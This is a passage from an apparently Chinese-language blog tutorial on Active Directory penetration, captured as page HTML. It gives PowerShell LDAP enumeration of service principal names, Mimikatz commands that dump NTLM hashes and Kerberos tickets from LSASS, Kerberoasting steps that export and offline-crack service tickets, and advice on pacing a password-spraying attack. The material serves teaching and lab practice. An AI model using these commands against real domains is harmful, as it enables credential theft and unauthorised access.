+</span></span><span class="line"><span class="cl"><span class="nv">$PDC</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$domainObj</span><span class="p">.</span><span class="n">PdcRoleOwner</span><span class="p">).</span><span class="py">Name</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$SearchString</span> <span class="p">=</span> <span class="s2">&#34;LDAP://&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$SearchString</span> <span class="p">+=</span> <span class="nv">$PDC</span> <span class="p">+</span> <span class="s2">&#34;/&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$DistinguishedName</span> <span class="p">=</span> <span class="s2">&#34;DC=</span><span class="p">$(</span><span class="nv">$domainObj</span><span class="p">.</span><span class="py">Name</span><span class="p">.</span><span class="py">Replace</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;,DC=&#39;</span><span class="p">))</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$SearchString</span> <span class="p">+=</span> <span class="nv">$DistinguishedName</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$Searcher</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">DirectoryServices</span><span class="p">.</span><span class="py">DirectorySearcher</span><span class="p">([</span><span class="no">ADSI</span><span class="p">]</span><span class="nv">$SearchString</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$objDomain</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">DirectoryServices</span><span class="p">.</span><span class="py">DirectoryEntry</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$Searcher</span><span class="p">.</span><span class="py">SearchRoot</span> <span class="p">=</span> <span class="nv">$objDomain</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$Searcher</span><span class="p">.</span><span class="k">filter</span><span class="p">=</span><span class="s2">&#34;serviceprincipalname=*http*&#34;</span>  <span class="c">#修改要查询的服务的字段。</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Result</span> <span class="p">=</span> <span class="nv">$Searcher</span><span class="p">.</span><span class="py">FindAll</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="k">Foreach</span><span class="p">(</span><span class="nv">$obj</span> <span class="k">in</span> <span class="nv">$Result</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl"><span class="k">Foreach</span><span class="p">(</span><span class="nv">$prop</span> <span class="k">in</span> <span class="nv">$obj</span><span class="p">.</span><span class="n">Properties</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$prop</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></div><h2 id="本地账户攻击">
+<a class="header-anchor" href="#%e6%9c%ac%e5%9c%b0%e8%b4%a6%e6%88%b7%e6%94%bb%e5%87%bb"></a>
+本地账户攻击
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">---------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c">#抓取本地密码hash值</span>
+</span></span><span class="line"><span class="cl">	<span class="c">#由于Kerberos 身份验证时须将密码哈希存储在某处才能更新TGT （TGT默认10小时一更新）请求。在当前版本的 Windows 中，这些哈希存储在本地安全机构子系统服务 (LSASS)内存空间中。</span>
+</span></span><span class="line"><span class="cl">	<span class="c">#目的：访问这些哈希，我们可以破解它们以：1.通过暴力破解获得明文密码</span>
+</span></span><span class="line"><span class="cl">									<span class="c"># 2.提取TGT和ST，用它们来执行各种操作。</span>
+</span></span><span class="line"><span class="cl">	<span class="c">#LSASS 进程是操作系统的一部分并以 SYSTEM 身份运行，因此我们需要 SYSTEM（或本地管理员）权限才能访问存储在目标上的哈希值。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c">#注：请注意，我们在上面的输出中突出显示了两种类型的哈希。这将根据 AD 实施的功能级别而有所不同。对于 Windows 2003 功能级别的 AD 实例，NTLM 是唯一可用的散列算法。对于运行 Windows Server 2008 或更高版本的实例，NTLM 和 SHA-1（AES 加密的常见伴侣）可能都可用。在 Windows 7 等较旧的操作系统或手动设置的操作系统上，将启用 WDigest,654。启用 WDigest 后，运行 Mimikatz 将在密码散列旁边显示明文密码。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span>  <span class="c">#启动</span>
+</span></span><span class="line"><span class="cl">     <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>  <span class="c">#进入特权模式</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sekurlsa</span><span class="p">::</span><span class="n">logonpasswords</span>  <span class="c">#提取ntlm hash</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span> <span class="c">#提取TGT和ST   </span>
+</span></span></code></pre></div><h2 id="服务账户攻击">
+<a class="header-anchor" href="#%e6%9c%8d%e5%8a%a1%e8%b4%a6%e6%88%b7%e6%94%bb%e5%87%bb"></a>
+服务账户攻击
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 服务账户攻击-离线破解</span>
+</span></span><span class="line"><span class="cl">	<span class="c">#为什么可以离线破解？</span>
+</span></span><span class="line"><span class="cl">		<span class="c">#答：ST票据是用服务账户密码的哈希值加密的。可通过字典无限制枚举尝试是否成功解密。		</span>
+</span></span><span class="line"><span class="cl">     <span class="c">#局限：如果特定 SPN 使用托管或组托管服务帐户，则密码将随机生成、复杂且长度为 120 个字符，从而无法破解。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># 构造ps语法：对一个服务（SPN）请求ST票据。请求成功后，ST票据会缓存本地。</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="py">IdentityModel</span> <span class="nb">New-Object</span> 
+</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="py">IdentityModel</span><span class="p">.</span><span class="py">Tokens</span><span class="p">.</span><span class="py">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s1">&#39;HTTP/CorpWebServer.corp.com&#39;</span>  <span class="c">#此处填写SPN名称，可以查。</span>
+</span></span><span class="line"><span class="cl"><span class="n">klist</span> <span class="c"># 列出缓存中的ST票据。该命令为ps自带命令。可以用普通账户权限列出当前账户缓存的ST，但是仅可查看列表信息，不能导出。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span>  <span class="c">#启动 </span>
+</span></span><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">list</span>  <span class="p">/</span><span class="n">export</span>   <span class="c">#列出并导出当前ST票据至当前目录。  </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span> <span class="p">&amp;&amp;</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">kerberoast</span> <span class="c">#安装并用字典破解，也可使用john和hashcat进行破解。</span>
+</span></span><span class="line"><span class="cl"> <span class="n">python</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">kerberoast</span><span class="p">/</span><span class="n">tgsrepcrack</span><span class="p">.</span><span class="py">py</span> <span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span> <span class="mf">1</span><span class="p">-</span><span class="n">40a50000-Offsec</span><span class="nv">@HTTP</span><span class="p">~</span><span class="n">CorpWebServer</span><span class="p">.</span><span class="py">corp</span><span class="p">.</span><span class="nb">com-CORP</span><span class="p">.</span><span class="py">COM</span><span class="p">.</span><span class="py">kirbi</span>
+</span></span></code></pre></div><h2 id="低速口令枚举">
+<a class="header-anchor" href="#%e4%bd%8e%e9%80%9f%e5%8f%a3%e4%bb%a4%e6%9e%9a%e4%b8%be"></a>
+低速口令枚举
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\Users\77629</span><span class="c1">&gt;net accounts   # 通过此命令查看锁定阈值，已调整枚举频率</span>
+</span></span><span class="line"><span class="cl">强制用户在时间到期之后多久必须注销?:     从不
+</span></span><span class="line"><span class="cl">密码最短使用期限(天):                    0
+</span></span><span class="line"><span class="cl">密码最长使用期限(天):                    42
+</span></span><span class="line"><span class="cl">密码长度最小值:                          0
+</span></span><span class="line"><span class="cl">保持的密码历史记录长度:                  None
+</span></span><span class="line"><span class="cl">锁定阈值:                                10
+</span></span><span class="line"><span class="cl">锁定持续时间(分):                        10
+</span></span><span class="line"><span class="cl">锁定观测窗口(分):                        10
+</span></span><span class="line"><span class="cl">计算机角色:                              WORKSTATION
+</span></span><span class="line"><span class="cl">命令成功完成。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">使用Spray-Passwords.ps1工具进行名密码喷洒攻击。
+</span></span></code></pre></div></div>
+    <footer class="article-footer"><ul class="article-category-list"><li class="article-tag-list-item" data-aos="zoom-in">
+    <a
+      class="article-category-link"
+      href="/categories/ad%e5%9f%9f-%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86"
+      data-aos="zoom-in"
+      >AD域-基础知识</a
+    >
+    </li></ul>
+<ul class="article-tag-list" itemprop="keywords"></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+              data-sizes="auto"
+              alt="htb-Base"
+              class="lazyload"
+            /><a
+          href="/post/htb/htb%E6%89%93%E9%9D%B6-base/"
+          aria-label="前一篇:htb-Base"
+          title="前一篇:htb-Base"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">htb-Base</h3>
+      </div></nav></article></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2020-2026<span class="footer-info-sep rotate"></span>L
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp;Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;83.0k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:30</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#信息枚举">信息枚举</a></li>
+    <li><a href="#本地账户攻击">本地账户攻击</a></li>
+    <li><a href="#服务账户攻击">服务账户攻击</a></li>
+    <li><a href="#低速口令枚举">低速口令枚举</a></li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="L"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">L</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">83</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      16
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </a>
+</div>
+<div class="sidebar-social" ><div class="icon-email sidebar-social-icon">
+      <a
+        href="#ZgotmplZ"
+        itemprop="url"
+        target="_blank"
+        aria-label="email"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/other_site"
+        aria-label="常用网站"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">常用网站</div>
+    </div></div></div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    
+    
+    
+    
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    
+    
+    
+    
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" integrity="" crossorigin="anonymous"  ></script><script src="/js/aos.js" integrity="" crossorigin="anonymous"  ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax ></script><script>
+  var setupFirework = () => {
+    if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+      if (window.firework) {
+        const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+        options.excludeElements = options.excludeelements;
+        delete options.excludeelements;
+        window.firework(options);
+      }
+    }
+  }
+</script><script
+    src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js"
+    defer
+    
+    
+    onload="setupFirework()"
+    integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8&#43;pUoWX8n1rgq282T" crossorigin="anonymous"></script><script>
+  var setupLive2d = () => {
+    live2d.init('https:\/\/fastly.jsdelivr.net\/gh\/D-Sketon\/plugin-live2d\/', {themeTipsPath: ""});
+  }
+</script><script
+    src="https://test692618.github.io/"
+    
+    async
+    
+    onload="setupLive2d()"
+    ></script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "L",
+          title: "域渗透实战",
+          url: "https:\/\/test692618.github.io\/post\/ad%E5%9F%9F\/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98\/",
+          description: " 信息枚举 net user #枚举本地账户 net user \/domain #枚举域内所有账户 net user [用户名] \/domain # 查看用户详情，所在组。域内最高权限组为“domain admins”。 net group \/domain # 枚举域内组 使用powershell进行信息枚举\n",
+          cover: "https:\/\/test692618.github.io\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax ></script><script src="/js/tabs.js" integrity="" crossorigin="anonymous" data-pjax defer></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+        }
+        pswp()
+      </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    
+    async
+    
+    
+    integrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
